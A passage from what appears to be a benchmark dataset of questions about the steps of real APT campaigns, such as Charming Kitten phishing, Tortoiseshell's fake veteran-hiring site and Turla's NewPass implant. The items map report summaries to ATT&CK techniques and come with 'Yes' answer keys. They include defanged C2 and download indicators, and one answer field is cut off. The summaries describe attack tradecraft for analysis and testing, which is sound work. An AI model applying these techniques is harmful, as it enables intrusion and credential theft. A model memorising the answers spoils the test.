Persistence: In some cases, the hackers did not change the passwords of the victim's accounts, allowing them to remain undetected and monitor communications in real-time.
Defense Evasion: The attackers used images instead of text in phishing emails to bypass Google's security systems. They also used third-party services like Firefox Screenshot to host these images. Additionally, a hidden tracking image was used in emails to alert the attackers when a target opened the email.
Credential Access: The phishing pages were designed for both desktop and mobile versions of Google and Yahoo! mail services. The attackers verified the victims' credentials in real-time and, if correct, prompted for the 2-step verification code, allowing them to bypass even two-factor authentication methods.
Others: The campaign's phishing infrastructure included over 20 domain names set up between September and November 2018. Technical reviews indicated that the attackers used VPNs and proxies with Dutch and French IP addresses but were traced back to real Iranian IP addresses during the preparation phase. The campaign's timing, methods, and targets suggest it is linked to the Charming Kitten group, known for its connections to the Iranian government. The campaign coincides with the U.S. imposing new sanctions on Iran on November 4, 2018, and aims to infiltrate accounts of individuals working on sanctions against Iran.",Yes,The Return of The Charming Kitten
736,193,193-Defense Evasion-T1564-Hide Artifacts,"Is it likely that Charming Kitten collected detailed information about their targets, such as geographic location and working times, before deploying phishing attacks and crafting fake security alerts, subsequently proceeding to add hidden tracking images and use artifact-based images for defense evasion?","Defense Evasion: The attackers used images instead of text in phishing emails to bypass Google's security systems. They also used third-party services like Firefox Screenshot to host these images. Additionally, a hidden tracking image was used in emails to alert the attackers when a target opened the email.","Reconnaissance: Certfa's review of 'The Return of The Charming Kitten' campaign reveals that Iranian state-backed hackers have targeted individuals involved in sanctions against Iran, as well as politicians, activists, and journalists worldwide. The attackers collected information on their targets prior to phishing attacks, tailoring their approach based on the target's cyber knowledge, contacts, activities, working time, and geographic location.
Initial Access: The campaign utilized phishing attacks through unknown email or social media accounts and compromised accounts of public figures. The attackers sent fake security alerts from email addresses like notifications.mailservices@gmail[.]com, and noreply.customermails@gmail[.]com, claiming unauthorized access attempts. They also used Google Site to create fake Google Drive download pages to trick users into entering their credentials.
Persistence: In some cases, the hackers did not change the passwords of the victim's accounts, allowing them to remain undetected and monitor communications in real-time.
Credential Access: The phishing pages were designed for both desktop and mobile versions of Google and Yahoo! mail services. The attackers verified the victims' credentials in real-time and, if correct, prompted for the 2-step verification code, allowing them to bypass even two-factor authentication methods.
Others: The campaign's phishing infrastructure included over 20 domain names set up between September and November 2018. Technical reviews indicated that the attackers used VPNs and proxies with Dutch and French IP addresses but were traced back to real Iranian IP addresses during the preparation phase. The campaign's timing, methods, and targets suggest it is linked to the Charming Kitten group, known for its connections to the Iranian government. The campaign coincides with the U.S. imposing new sanctions on Iran on November 4, 2018, and aims to infiltrate accounts of individuals working on sanctions against Iran.",Yes,The Return of The Charming Kitten
738,193,193-Credential Access-T1056-Input Capture,"After utilizing phishing attempts to gain initial access with tactics such as using fake security alerts to steal credentials, is it likely that the Charming Kitten group will verify victims' credentials in real-time and design phishing pages for desktop and mobile versions to continue their credential harvesting?","Credential Access: The phishing pages were designed for both desktop and mobile versions of Google and Yahoo! mail services. The attackers verified the victims' credentials in real-time and, if correct, prompted for the 2-step verification code, allowing them to bypass even two-factor authentication methods.","Reconnaissance: Certfa's review of 'The Return of The Charming Kitten' campaign reveals that Iranian state-backed hackers have targeted individuals involved in sanctions against Iran, as well as politicians, activists, and journalists worldwide. The attackers collected information on their targets prior to phishing attacks, tailoring their approach based on the target's cyber knowledge, contacts, activities, working time, and geographic location.
Initial Access: The campaign utilized phishing attacks through unknown email or social media accounts and compromised accounts of public figures. The attackers sent fake security alerts from email addresses like notifications.mailservices@gmail[.]com, and noreply.customermails@gmail[.]com, claiming unauthorized access attempts. They also used Google Site to create fake Google Drive download pages to trick users into entering their credentials.
Persistence: In some cases, the hackers did not change the passwords of the victim's accounts, allowing them to remain undetected and monitor communications in real-time.
Defense Evasion: The attackers used images instead of text in phishing emails to bypass Google's security systems. They also used third-party services like Firefox Screenshot to host these images. Additionally, a hidden tracking image was used in emails to alert the attackers when a target opened the email.
Others: The campaign's phishing infrastructure included over 20 domain names set up between September and November 2018. Technical reviews indicated that the attackers used VPNs and proxies with Dutch and French IP addresses but were traced back to real Iranian IP addresses during the preparation phase. The campaign's timing, methods, and targets suggest it is linked to the Charming Kitten group, known for its connections to the Iranian government. The campaign coincides with the U.S. imposing new sanctions on Iran on November 4, 2018, and aims to infiltrate accounts of individuals working on sanctions against Iran.",Yes,The Return of The Charming Kitten
739,193,193-Credential Access-T1111-Multi-Factor Authentication Interception,"After using images instead of text in phishing emails to evade Google's security systems, is it likely that the attackers will verify victims' credentials in real-time and subsequently prompt for the 2-step verification code?","Credential Access: The phishing pages were designed for both desktop and mobile versions of Google and Yahoo! mail services. The attackers verified the victims' credentials in real-time and, if correct, prompted for the 2-step verification code, allowing them to bypass even two-factor authentication methods.","Reconnaissance: Certfa's review of 'The Return of The Charming Kitten' campaign reveals that Iranian state-backed hackers have targeted individuals involved in sanctions against Iran, as well as politicians, activists, and journalists worldwide. The attackers collected information on their targets prior to phishing attacks, tailoring their approach based on the target's cyber knowledge, contacts, activities, working time, and geographic location.
Initial Access: The campaign utilized phishing attacks through unknown email or social media accounts and compromised accounts of public figures. The attackers sent fake security alerts from email addresses like notifications.mailservices@gmail[.]com, and noreply.customermails@gmail[.]com, claiming unauthorized access attempts. They also used Google Site to create fake Google Drive download pages to trick users into entering their credentials.
Persistence: In some cases, the hackers did not change the passwords of the victim's accounts, allowing them to remain undetected and monitor communications in real-time.
Defense Evasion: The attackers used images instead of text in phishing emails to bypass Google's security systems. They also used third-party services like Firefox Screenshot to host these images. Additionally, a hidden tracking image was used in emails to alert the attackers when a target opened the email.
Others: The campaign's phishing infrastructure included over 20 domain names set up between September and November 2018. Technical reviews indicated that the attackers used VPNs and proxies with Dutch and French IP addresses but were traced back to real Iranian IP addresses during the preparation phase. The campaign's timing, methods, and targets suggest it is linked to the Charming Kitten group, known for its connections to the Iranian government. The campaign coincides with the U.S. imposing new sanctions on Iran on November 4, 2018, and aims to infiltrate accounts of individuals working on sanctions against Iran.",Yes,The Return of The Charming Kitten
741,194,194-Initial Access-T1566-Phishing,"After the Desert Falcons operated campaigns targeting high-profile victims using homemade backdoors for Command and Control activities like keylogging and password stealing, is it likely that they conducted spear phishing emails and social engineering techniques to achieve Initial Access?","Initial Access: The Desert Falcons used spear phishing emails with carefully selected filenames and attachments to target victims, including governments and high-profile media. They also employed social engineering to exploit victims' trust in social networking forums and curiosity about political conflict. Techniques included the rar/lnk trick, right-to-left extension override, and fake RealPlayer plugin trick. Targeted Facebook attacks were conducted through chat, using authentic accounts to gain victims' trust before sending Trojan files disguised as images. Mass infections among activists and political figures were achieved through Facebook posts and redirects to fake pages with political content.","Command and Control: The Desert Falcons operated three campaigns using different C&C/IPs, targeting various victim types and managed by different team members. Campaign 1 targeted high-profile victims in Palestine, Jordan, Egypt, and the Gulf states, focusing on government organizations, military centers, and top media outlets. Campaign 2 targeted victims in Israel, and Campaign 3 focused on activists, political figures, and radio/TV channels in Egypt. The campaigns used homemade backdoors for full access and control, including the Falcons' main Trojan and DHS spyware, which provided functionalities like screenshots, keylogs, file upload/download, password stealing, and audio recording.
Others: The Desert Falcons, a group of cybermercenaries from the Middle East, began operations in 2011 with infections traced back to 2013. They developed malware targeting Windows and Android devices and used various infection vectors. Victims included military, government, media, financial institutions, research and education institutions, activists, political leaders, energy firms, and physical security companies, mainly located in Egypt, Palestine, Israel, and Jordan. The group stole over one million files containing sensitive information. Kaspersky Lab's investigation led to the identification of some group members, confirming they are native Arabic speakers from the Middle East. The Desert Falcons are expected to continue developing Trojans and using more advanced techniques.",Yes,The-Desert-Falcons-targeted-attacks
742,195,195-Reconnaissance-T1592-Gather Victim Host Information,"After Tortoiseshell gained initial access by tricking users into downloading a malware downloader app from the fraudulent website hiremilitaryheroes[.]com, is it likely that the malware downloader executed binaries to retrieve reconnaissance and RAT tools as part of the execution phase before conducting reconnaissance via 'bird.exe' to collect detailed victim host information?","Reconnaissance: The threat actor Tortoiseshell created a fake veteran hiring website (hiremilitaryheroes[.]com) to conduct reconnaissance. The website prompted users to download an app, which was a malware downloader. The downloaded reconnaissance tool, named 'bird.exe' with the internal name Liderc, collected extensive information from the victim's machine, including date, time, drivers, system patch level, number of processors, network configuration, hardware, firmware versions, domain controller, admin name, account list, and screen size using WMI.","Initial Access: Tortoiseshell gained initial access by tricking users into downloading a fake app from the fraudulent website hiremilitaryheroes[.]com, which closely resembled the legitimate service hiringourheroes.org. The app served as a malware downloader.
Execution: The malware downloader executed two binaries retrieved from hxxp://199[.]187[.]208[.]75/MyWS.asmx/GetUpdate?val=UID. These binaries were stored in base64 and included a reconnaissance tool and a Remote Administrative Tool (RAT), which was executed as a service.
Persistence: The RAT named 'IvizTech' was installed and executed as a service to maintain persistence on the victim's system.
Defense Evasion: The malware employed defense evasion by checking if Google was reachable before proceeding with the installation. If unreachable, the installation stopped, potentially evading network-based defenses that block known malicious domains. The RAT was designed to be modular, allowing the attacker to update the Command and Control (C2) server without recompiling, and required the installer for access, complicating analysis by researchers.
Discovery: The reconnaissance tool 'bird.exe' performed discovery by collecting detailed information about the victim's machine, which could be used for further attacks.
Command and Control: The RAT communicated with a C2 server, with the IP address provided as an argument to the service. This design was intended to prevent direct access to the C2 server without the installer, making it more difficult for researchers to analyze the malware.
Others: The CTI report by Cisco Talos, authored by Warren Mercer and Paul Rascagneres with contributions from Jungsoo An, details the actions of Tortoiseshell, including the creation of a fake veteran hiring website to host malware. The report also mentions the use of hardcoded email credentials within the installer for error reporting, indicating poor operational security (OPSEC). Additionally, the report provides information on the network infrastructure used by Tortoiseshell, including IP addresses and domains, as well as samples of the installers and reconnaissance PE. It also suggests the use of intrusion prevention systems like SNORT, Cisco AMP for Endpoints, Cisco Cloud Web Security, Email Security, Network Security appliances, AMP Threat Grid, and Umbrella to detect and block threats related to Tortoiseshell.",Yes,How Tortoiseshell created a fake veteran hiring website to host malware
743,195,195-Reconnaissance-T1594-Search Victim-Owned Websites,"After Tortoiseshell executed the reconnaissance tool 'bird.exe' to perform discovery and before gaining initial access by tricking users into downloading a fake app from hiremilitaryheroes[.]com, is it likely that Tortoiseshell created the website hiremilitaryheroes[.]com specifically to conduct reconnaissance campaigns and host malware downloaders?","Reconnaissance: The threat actor Tortoiseshell created a fake veteran hiring website (hiremilitaryheroes[.]com) to conduct reconnaissance. The website prompted users to download an app, which was a malware downloader. The downloaded reconnaissance tool, named 'bird.exe' with the internal name Liderc, collected extensive information from the victim's machine, including date, time, drivers, system patch level, number of processors, network configuration, hardware, firmware versions, domain controller, admin name, account list, and screen size using WMI.","Initial Access: Tortoiseshell gained initial access by tricking users into downloading a fake app from the fraudulent website hiremilitaryheroes[.]com, which closely resembled the legitimate service hiringourheroes.org. The app served as a malware downloader.
Execution: The malware downloader executed two binaries retrieved from hxxp://199[.]187[.]208[.]75/MyWS.asmx/GetUpdate?val=UID. These binaries were stored in base64 and included a reconnaissance tool and a Remote Administrative Tool (RAT), which was executed as a service.
Persistence: The RAT named 'IvizTech' was installed and executed as a service to maintain persistence on the victim's system.
Defense Evasion: The malware employed defense evasion by checking if Google was reachable before proceeding with the installation. If unreachable, the installation stopped, potentially evading network-based defenses that block known malicious domains. The RAT was designed to be modular, allowing the attacker to update the Command and Control (C2) server without recompiling, and required the installer for access, complicating analysis by researchers.
Discovery: The reconnaissance tool 'bird.exe' performed discovery by collecting detailed information about the victim's machine, which could be used for further attacks.
Command and Control: The RAT communicated with a C2 server, with the IP address provided as an argument to the service. This design was intended to prevent direct access to the C2 server without the installer, making it more difficult for researchers to analyze the malware.
Others: The CTI report by Cisco Talos, authored by Warren Mercer and Paul Rascagneres with contributions from Jungsoo An, details the actions of Tortoiseshell, including the creation of a fake veteran hiring website to host malware. The report also mentions the use of hardcoded email credentials within the installer for error reporting, indicating poor operational security (OPSEC). Additionally, the report provides information on the network infrastructure used by Tortoiseshell, including IP addresses and domains, as well as samples of the installers and reconnaissance PE. It also suggests the use of intrusion prevention systems like SNORT, Cisco AMP for Endpoints, Cisco Cloud Web Security, Email Security, Network Security appliances, AMP Threat Grid, and Umbrella to detect and block threats related to Tortoiseshell.",Yes,How Tortoiseshell created a fake veteran hiring website to host malware
745,195,195-Execution-T1569-System Services,"After Tortoiseshell gains initial access by tricking users into downloading a fake app from hiremilitaryheroes[.]com, is it likely that the malware downloader will execute binaries before the RAT named 'IvizTech' is installed and executed as a service to maintain persistence?","Execution: The malware downloader executed two binaries retrieved from hxxp://199[.]187[.]208[.]75/MyWS.asmx/GetUpdate?val=UID. These binaries were stored in base64 and included a reconnaissance tool and a Remote Administrative Tool (RAT), which was executed as a service.","Reconnaissance: The threat actor Tortoiseshell created a fake veteran hiring website (hiremilitaryheroes[.]com) to conduct reconnaissance. The website prompted users to download an app, which was a malware downloader. The downloaded reconnaissance tool, named 'bird.exe' with the internal name Liderc, collected extensive information from the victim's machine, including date, time, drivers, system patch level, number of processors, network configuration, hardware, firmware versions, domain controller, admin name, account list, and screen size using WMI.
Initial Access: Tortoiseshell gained initial access by tricking users into downloading a fake app from the fraudulent website hiremilitaryheroes[.]com, which closely resembled the legitimate service hiringourheroes.org. The app served as a malware downloader.
Persistence: The RAT named 'IvizTech' was installed and executed as a service to maintain persistence on the victim's system.
Defense Evasion: The malware employed defense evasion by checking if Google was reachable before proceeding with the installation. If unreachable, the installation stopped, potentially evading network-based defenses that block known malicious domains. The RAT was designed to be modular, allowing the attacker to update the Command and Control (C2) server without recompiling, and required the installer for access, complicating analysis by researchers.
Discovery: The reconnaissance tool 'bird.exe' performed discovery by collecting detailed information about the victim's machine, which could be used for further attacks.
Command and Control: The RAT communicated with a C2 server, with the IP address provided as an argument to the service. This design was intended to prevent direct access to the C2 server without the installer, making it more difficult for researchers to analyze the malware.
Others: The CTI report by Cisco Talos, authored by Warren Mercer and Paul Rascagneres with contributions from Jungsoo An, details the actions of Tortoiseshell, including the creation of a fake veteran hiring website to host malware. The report also mentions the use of hardcoded email credentials within the installer for error reporting, indicating poor operational security (OPSEC). Additionally, the report provides information on the network infrastructure used by Tortoiseshell, including IP addresses and domains, as well as samples of the installers and reconnaissance PE. It also suggests the use of intrusion prevention systems like SNORT, Cisco AMP for Endpoints, Cisco Cloud Web Security, Email Security, Network Security appliances, AMP Threat Grid, and Umbrella to detect and block threats related to Tortoiseshell.",Yes,How Tortoiseshell created a fake veteran hiring website to host malware
746,195,195-Persistence-T1543-Create or Modify System Process,"After executing a malware downloader to retrieve and execute binaries including a RAT from a remote server, is Tortoiseshell likely to employ the RAT to maintain communication with the C2 server using a provided IP address after installing and executing it as a service for persistence?",Persistence: The RAT named 'IvizTech' was installed and executed as a service to maintain persistence on the victim's system.,"Reconnaissance: The threat actor Tortoiseshell created a fake veteran hiring website (hiremilitaryheroes[.]com) to conduct reconnaissance. The website prompted users to download an app, which was a malware downloader. The downloaded reconnaissance tool, named 'bird.exe' with the internal name Liderc, collected extensive information from the victim's machine, including date, time, drivers, system patch level, number of processors, network configuration, hardware, firmware versions, domain controller, admin name, account list, and screen size using WMI.
Initial Access: Tortoiseshell gained initial access by tricking users into downloading a fake app from the fraudulent website hiremilitaryheroes[.]com, which closely resembled the legitimate service hiringourheroes.org. The app served as a malware downloader.
Execution: The malware downloader executed two binaries retrieved from hxxp://199[.]187[.]208[.]75/MyWS.asmx/GetUpdate?val=UID. These binaries were stored in base64 and included a reconnaissance tool and a Remote Administrative Tool (RAT), which was executed as a service.
Defense Evasion: The malware employed defense evasion by checking if Google was reachable before proceeding with the installation. If unreachable, the installation stopped, potentially evading network-based defenses that block known malicious domains. The RAT was designed to be modular, allowing the attacker to update the Command and Control (C2) server without recompiling, and required the installer for access, complicating analysis by researchers.
Discovery: The reconnaissance tool 'bird.exe' performed discovery by collecting detailed information about the victim's machine, which could be used for further attacks.
Command and Control: The RAT communicated with a C2 server, with the IP address provided as an argument to the service. This design was intended to prevent direct access to the C2 server without the installer, making it more difficult for researchers to analyze the malware.
Others: The CTI report by Cisco Talos, authored by Warren Mercer and Paul Rascagneres with contributions from Jungsoo An, details the actions of Tortoiseshell, including the creation of a fake veteran hiring website to host malware. The report also mentions the use of hardcoded email credentials within the installer for error reporting, indicating poor operational security (OPSEC). Additionally, the report provides information on the network infrastructure used by Tortoiseshell, including IP addresses and domains, as well as samples of the installers and reconnaissance PE. It also suggests the use of intrusion prevention systems like SNORT, Cisco AMP for Endpoints, Cisco Cloud Web Security, Email Security, Network Security appliances, AMP Threat Grid, and Umbrella to detect and block threats related to Tortoiseshell.",Yes,How Tortoiseshell created a fake veteran hiring website to host malware
750,196,196-Command and Control-T1573-Encrypted Channel,"After the NewPass implant uses a loader library to decode the configuration file and evade detection, is it likely that the malware will communicate with the command-and-control server before exfiltrating information using encrypted POST requests?","Command and Control: The NewPass agent communicates with a command-and-control server using a domain name (newshealthsport[.]com) and path (/sport/latest.php). The agent uses a set of keywords to separate data within a POST request, making the communication stealthier. The HTTP requests are encrypted, likely using one of the keys from the previous configuration, with a probable custom encryption algorithm.","Execution: Telsy reported that the threat actor known as Venomous Bear (aka Turla or Uroburos) used a dropper to execute a previously unseen implant named 'NewPass'. The dropper, identified by SHA256 hash e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078, exports a function named 'LocalDataVer' which serves as an entry point for the DLL. This function is used to deploy the backdoor and its configuration file, avoiding detection by sandbox solutions and manual analysis by terminating the program if 'DllMain' or 'DllRegisterServer' are used as entry points.
Persistence: The NewPass malware uses a persistence mechanism by creating a new Windows service named 'Adobe Update Module' pointing to the path of the loader. This method allows the malware to interact with the SCManager and maintain persistence on the system.
Defense Evasion: The NewPass implant uses a loader library to decode a binary file and extract the agent component responsible for specific operations. The loader and agent share a JSON configuration in memory, which allows the attackers to customize the implant by changing configuration entries. The loader checks for the presence of an associated configuration file and decodes the initial configuration using a simple XOR algorithm. The final agent is hidden in the configuration file after a section of random bytes used to change the hash value of the file at every infection.
Exfiltration: The NewPass agent is responsible for exfiltrating information from the infected machine and sending it to the command-and-control server. It uses a POST request with encrypted values to exfiltrate data.
Others: Telsy suspects that the NewPass implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs. The malware is composed of different components, including a dropper, a loader library, and an agent, which rely on an encoded file to pass information and configuration between each other. The implant supports different types of persistence mechanisms and is identified by an ID used during communication with the C2 as an identifier of the infected machine. The malware version numbers are 19.03.28 for the AgentLoader and 19.7.16 for the Agent.",Yes,Turla _ Venomous Bear updates its arsenal_ _NewPass_ appears on the APT threat scene - Telsy
754,197,197-Initial Access-T1566-Phishing,"After the malicious XLS attachment used a VB macro to silently download a malicious MSI package for execution, is it likely that the MSI package will achieve persistence by installing an LNK file for autorun at Windows Startup?","Initial Access: On February 24, 2022, Proofpoint detected an email from a ukr[.]net address sent to a European government entity. The email's subject was 'IN ACCORDANCE WITH THE DECISION OF THE EMERGENCY MEETING OF THE SECURITY COUNCIL OF UKRAINE DATED 24.02.2022' and included a macro-enabled XLS file titled 'list of persons.xlsx,' which was designed to deliver SunSeed malware.","Execution: The malicious XLS attachment contained a VB macro named 'Module1' that created a Windows Installer object to call out to an actor-controlled staging IP and download a malicious MSI package. The macro set the UILevel to '2' for a silent installation, hiding actions and network connections from the user.
Persistence: The MSI package installed legitimate Lua dependencies, a modified Windows Lua interpreter, a malicious Lua script named SunSeed, and established persistence via an LNK file installed for autorun at Windows Startup.
Defense Evasion: The MSI package used for SunSeed malware installation utilized the Japanese Shift-JIS code base, potentially as a false flag. The package was created using an outdated version of WiX Toolset version 3.11.0.1528, and the legitimate Windows Lua interpreter sppsvc.exe was modified to suppress console output.
Command and Control: The SunSeed malware issued GET requests over HTTP via port 80 using a Lua Socket to the C2 server every three seconds, appending the infected target's C Drive partition serial number to the URI request.
Others: Proofpoint identified a phishing campaign likely sponsored by a nation-state, using a possibly compromised Ukrainian armed service member's email account to target European government personnel involved in refugee logistics. The campaign is similar to activity observed in July 2021, suggesting the same threat actor, tracked as part of TA445, is behind both. The campaign's focus on European government personnel managing refugee movement aligns with TA445's tactics, including disinformation operations to manipulate European sentiment around refugees. The campaign may be part of a hybrid warfare model employed by the Russian military and Belarus, aiming to gather intelligence and potentially exploit refugee movements for disinformation purposes.",Yes,Asylum Ambuscade_ State Actor Uses Compromised Private Ukrainian Military Emails to Target European Governments and Refugee Movement _ Proofpoint US
767,199,199-Command and Control-T1571-Non-Standard Port,"After employing a device driver to hook into the Windows firewall for evading detection during network packet inspection, is the Derusbi server variant likely to establish command and control by selecting a random port between 40,000 and 45,000, instructing the driver to redirect appropriate TCP sessions to that port, and sending victim information using a VictimInfoPacket?","Command and Control: The Derusbi server variant establishes command and control by selecting a random port between 40,000 and 45,000 to listen for incoming connections. It instructs the driver to redirect appropriate TCP sessions to this port. The communication between the server variant and the controlling client is encrypted and consists of a sequence of encrypted datagrams with a 24-byte header followed by an optional payload section. The server variant sends information about the victim's computer to the client using a VictimInfoPacket.","Execution: The Derusbi server variant, a type of Remote Access Trojan (RAT), is executed as a service dependent on svchost. It begins its startup sequence by determining the host binary name and its own DLL name, then spawns a new thread containing the main server code. This allows the DllEntryPoint routine to return to the calling function. The server variant checks for sufficient access rights, requiring NT Authority to operate. If the check fails, the server variant terminates. After a 5-second sleep, it verifies the fShutdown flag is not set, which could be triggered by the process loading the server variant calling the DllRegisterServer export. The mainLoop function is then called, which handles the loading of the unique infection ID from the registry or configuration from an encoded buffer, and then saves the newly generated infection ID to the registry.
Persistence: The Derusbi server variant ensures its persistence by installing itself as a service on the victim's machine. This is achieved through the DllRegisterServer function, which is given time to activate and perform necessary operations during the server variant's startup sequence.
Privilege Escalation: The Derusbi server variant attempts to obtain privileges for SeDebugPrivilege, SeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege, which are necessary for loading the driver component of the malware. If the 360 antivirus product is detected on the victim's machine, the driver is not installed, but the mainLoop continues regardless. If the antivirus is not found, the mainLoop extracts, decodes, and installs the driver binary from an encoded buffer within itself.
Defense Evasion: The Derusbi server variant employs a device driver to hook into the Windows firewall, using undocumented techniques for Windows XP and older or the Windows Filtering Platform for Vista and later. The driver inspects incoming network packets and redirects communication sessions to the server variant if a specific handshake is detected. This allows the attacker to hide their communication within legitimate network sessions, evading detection.
Others: The Derusbi server variant's communication and command dispatch involve selecting a random port for listening, establishing a valid handshake for communication, and sending victim information to the client. The handshake is well-defined, consisting of a 64-byte random buffer with specific DWORD patterns. If the handshake fails, a secondary authentication method using a POST request is available. The server variant has a modular design, supporting up to 8 different modules per sample, including remote command shell, network tunneling, and file management. The malware waits for input from the network and routes packets to the appropriate handler. Detection of the Derusbi server variant can be challenging due to the encrypted nature of its network traffic, but heuristic approaches and YARA signatures can be used for detection.",Yes,Derusbi_Server_Analysis-Final
772,2,2-Execution-T1204-User Execution,"After recipients are sent spear phishing emails containing links to RTF documents exploiting CVE-2017-8750 for QuasarRAT delivery, is it likely that the recipients will be presented with a document simulating a legitimate blog post or report before the target user gets infected with QuasarRAT?","Execution: Upon opening the above attachments, the recipient will be presented with a document that is a direct copy of a blog post or report released by the think tank organization being impersonated. At first glance, everything might look legitimate, but in the background the target user has likely just been infected with QuasarRAT. QuasarRAT is a freely available \","Reconnaissance: In March and April 2018, Volexity identified multiple spear phishing campaigns attributed to Patchwork, an Indian APT group also known as Dropping Elephant. This increase in threat activity was consistent with other observations documented over the last few months in blogs by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend Micro noting targets in South Asia. From the attacks observed by Volexity, what is most notable is that Patchwork has pivoted its targeting and has launched attacks directly against US-based think tanks. Volexity has also found that, in addition to sending malware lures, the Patchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of identifying which recipients opened their e-mail messages.
Initial Access: In three observed spear phishing campaigns, the threat actors leveraged domains and themes mimicking those of well-known think tank organizations in the United States. The group lifted articles and themes from the Council on Foreign Relations (CFR), the Center for Strategic and International Studies (CSIS), and the Mercator Institute for China Studies (MERICS) for use in their spear phishing lures and malicious Rich Text Format (RTF) documents. Strangely, in one case, the threat actors also appear to have used a domain name similar to the Foreign Policy Research Institute (FPRI) in a message purporting to be from CFR. Each of the spear phishing attacks contained links to .doc files, which were really RTF documents that attempt to exploit CVE-2017-8750 (Composite Moniker). The threat actors appear to have leveraged publicly available exploit code that can be found on Github at the URL: https://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat actors will attempt to drop and execute QuasarRAT.
Persistence: After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\Users\%username%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe. The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN. This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot.
Command and Control: Once the task is triggered, it will then repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will initiate a request to freegeoip.net in order to determine the geographical location of the infected host. Immediately following the request, the malware will begin to beacon over an encrypted connection to the threat actor's command and control domain tautiaos.com (43.249.37.199).",Yes,patchwork-apt-group-targets-us-think-tanks
773,2,2-Persistence-T1053-Scheduled Task/Job,"After recipients open spear phishing attachments leading to the execution of QuasarRAT disguised as legitimate documents, is it likely that the malware will use a .NET wrapper DLL to create a scheduled task for persistence before pointing the task to the QuasarRAT binary, microsoft_network.exe?","Persistence: After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\Users\%username%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe. The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN. This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot.","Reconnaissance: In March and April 2018, Volexity identified multiple spear phishing campaigns attributed to Patchwork, an Indian APT group also known as Dropping Elephant. This increase in threat activity was consistent with other observations documented over the last few months in blogs by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend Micro noting targets in South Asia. From the attacks observed by Volexity, what is most notable is that Patchwork has pivoted its targeting and has launched attacks directly against US-based think tanks. Volexity has also found that, in addition to sending malware lures, the Patchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of identifying which recipients opened their e-mail messages.
Initial Access: In three observed spear phishing campaigns, the threat actors leveraged domains and themes mimicking those of well-known think tank organizations in the United States. The group lifted articles and themes from the Council on Foreign Relations (CFR), the Center for Strategic and International Studies (CSIS), and the Mercator Institute for China Studies (MERICS) for use in their spear phishing lures and malicious Rich Text Format (RTF) documents. Strangely, in one case, the threat actors also appear to have used a domain name similar to the Foreign Policy Research Institute (FPRI) in a message purporting to be from CFR. Each of the spear phishing attacks contained links to .doc files, which were really RTF documents that attempt to exploit CVE-2017-8750 (Composite Moniker). The threat actors appear to have leveraged publicly available exploit code that can be found on Github at the URL: https://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat actors will attempt to drop and execute QuasarRAT.
Execution: Upon opening the above attachments, the recipient will be presented with a document that is a direct copy of a blog post or report released by the think tank organization being impersonated. At first glance, everything might look legitimate, but in the background the target user has likely just been infected with QuasarRAT. QuasarRAT is a freely available \
Command and Control: Once the task is triggered, it will then repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will initiate a request to freegeoip.net in order to determine the geographical location of the infected host. Immediately following the request, the malware will begin to beacon over an encrypted connection to the threat actor's command and control domain tautiaos.com (43.249.37.199).",Yes,patchwork-apt-group-targets-us-think-tanks
775,20,20-Reconnaissance-T1589-Gather Victim Identity Information,"After targeting victims related to Uyghurs through phishing attacks to gather victim identity information, is it likely that Earth Empusa will achieve initial access by inviting users to download a modified archive file containing the ActionSpy Android spyware?","Reconnaissance: The Earth Empusa group, also known as POISON CARP/Evil Eye, was observed using phishing attacks to deliver the ActionSpy malware. They targeted users in Tibet and Turkey before extending their scope to Taiwan. The campaign targeted victims related to Uyghurs by compromising their Android and iOS mobile devices. The group is known for using watering hole attacks, but phishing attacks have been recently observed. In April 2020, a phishing page disguised as a download page for a popular Android video application in Tibet was found, which may have been created by Earth Empusa. The page contained malicious scripts hosted on a domain belonging to the group.","Initial Access: The phishing page invited users to download a video app known to Tibetan Android users. The download link was modified to an archive file containing the Android application, which was an undocumented Android spyware named ActionSpy.
Execution: ActionSpy is an Android spyware that impersonates a legitimate Uyghur video app called Ekran. It uses VirtualApp to achieve the same appearance and features as the original app and is protected by Bangcle to evade static analysis and detection. ActionSpy collects basic device information every 30 seconds and sends it to the C&C server as a heartbeat request.
Persistence: ActionSpy prompts users to turn on its Accessibility service, claiming it is a memory garbage cleaning service. Once enabled, ActionSpy monitors Accessibility events on the device to steal chat log files from messaging apps like WeChat, QQ, WhatsApp, and Viber indirectly.
Defense Evasion: ActionSpy is protected by Bangcle to evade static analysis and detection. Its configuration, including the C&C server address, is encrypted by DES, with the decryption key generated in native code, making static analysis difficult.
Credential Access: ActionSpy abuses the Android Accessibility service to collect chat logs from instant messaging applications by monitoring Accessibility events and parsing the current activity contents to extract information like nicknames, chat contents, and chat time.
Collection: ActionSpy supports modules for collecting various types of data, including device location, contacts, call logs, SMS messages, browser bookmarks, installed app info, running processes, Wi-Fi hotspots info, files on SDCard, and chat logs from WeChat, QQ, WhatsApp, and Viber.
Command and Control: All communication traffic between the C&C and ActionSpy is encrypted by RSA and transferred via HTTP. The C&C server may return commands to be performed on the compromised device.
